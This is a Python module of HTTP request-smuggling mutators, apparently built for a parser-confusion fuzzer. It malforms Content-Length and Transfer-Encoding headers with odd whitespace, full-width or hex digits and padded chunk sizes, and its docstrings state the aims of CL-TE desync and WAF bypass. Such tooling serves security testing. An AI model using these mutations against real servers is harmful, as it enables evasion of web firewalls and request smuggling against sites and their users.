#!/usr/bin/env python3
"""
advanced_level.py - Deep Obfuscation Mutators for Parser Confusion
------------------------------------------------------------------
These mutators go beyond HDHunter's standard corpus to exploit edge cases
in C/C++ HTTP parsers (like Nginx, HAProxy) vs Python/Java parsers (WSGI/Tomcat).

Features:
1. Whitespace injection (Vertical Tabs, Line Folding, Null bytes)
2. Unicode/Hex Encoding abuses (Full-width digits, illegal hex)
3. Header Key malformation (Space-before-colon)
"""

import random
import re


def obfuscate_whitespace(payload: bytes) -> bytes:
    """
    Inject strange whitespaces around critical headers.
    RFC7230 prohibits space between Header name and colon, but some 
    backends allow it while proxies drop or misinterpret it.
    """
    try:
        text = payload.decode('latin-1')
        
        # Whitespace dictionary: Vertical Tab, Form Feed, Null, Carriage Return Only, NBSP
        weird_spaces = ["\x0B", "\x0C", "\x00", "\r", "\t", " \t ", "\xa0"]
        space = random.choice(weird_spaces)

        # Mutate Content-Length
        if "Content-Length:" in text:
            # Inject space BEFORE colon (Request Smuggling classic: CL-TE desync)
            text = text.replace("Content-Length:", f"Content-Length{space}:")
            # Inject space AFTER colon
            text = text.replace("Content-Length: ", f"Content-Length:{space}")
            
        # Mutate Transfer-Encoding
        if "Transfer-Encoding:" in text:
            text = text.replace("Transfer-Encoding:", f"Transfer-Encoding{space}:")
            text = text.replace("Transfer-Encoding: chunked", f"Transfer-Encoding: {space}chunked{space}")

        # HTTP/1.1 Line Folding (obsolete but parsers still try to support it)
        # e.g. Transfer-Encoding:\r\n chunked
        if random.random() > 0.5:
            text = text.replace("Transfer-Encoding: chunked", "Transfer-Encoding:\r\n chunked")

        return text.encode('latin-1')
    except Exception:
        return payload


def obfuscate_unicode_encoding(payload: bytes) -> bytes:
    """
    Use full-width Unicode characters and hex-encoding to bypass WAFs
    and confuse Content-Length calculations.
    """
    try:
        text = payload.decode('latin-1')
        
        # Full-width numeric map (U+FF10 to U+FF19)
        full_width_map = str.maketrans("0123456789", "０１２３４５６７８９")
        
        # Obfuscate CL numbers using full-width or scientific notation
        if re.search(r"Content-Length: \d+", text):
            match = re.search(r"Content-Length: (\d+)", text)
            if match:
                cl_val = match.group(1)
                
                strategies = [
                    lambda x: x.translate(full_width_map),  # "10" -> "１０"
                    lambda x: f"+{x}",                      # "10" -> "+10"
                    lambda x: f"-0{x}",                     # "10" -> "-010"
                    lambda x: f"0x{int(x):x}",              # "10" -> "0xa" (Hex notation)
                ]
                
                malformed_cl = random.choice(strategies)(cl_val)
                text = text.replace(f"Content-Length: {cl_val}", f"Content-Length: {malformed_cl}")

        # Chunk size obfuscation: Injecting illegal hex characters 
        # (e.g., instead of `b\r\n`, use `00000b;ignore-this=param\r\n`)
        if re.search(r"\r\n([0-9a-fA-F]+)\r\n", text):
            # Pad with leading zeros and add chunk extensions
            text = re.sub(
                r"\r\n([0-9a-fA-F]+)\r\n", 
                r"\r\n0000000\1;ext=evil\r\n", 
                text, 
                count=1
            )

        return text.encode('latin-1')
    except Exception:
        return payload


def inject_smuggling_prefix(payload: bytes) -> bytes:
    """
    Prepends junk or HTTP/0.9 preamble to confuse the proxy's boundary detection.
    Some WAFs drop it, some proxies forward it, backend misinterprets the start.
    """
    # Junk prefixes: CRLF, GET / HTTP/0.9
    prefixes = [
        b"\r\n\r\n\r\n",
        b"GET / HTTP/1.1\r\n\r\n",
        b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",  # HTTP/2 Connection Preface
    ]
    
    return random.choice(prefixes) + payload
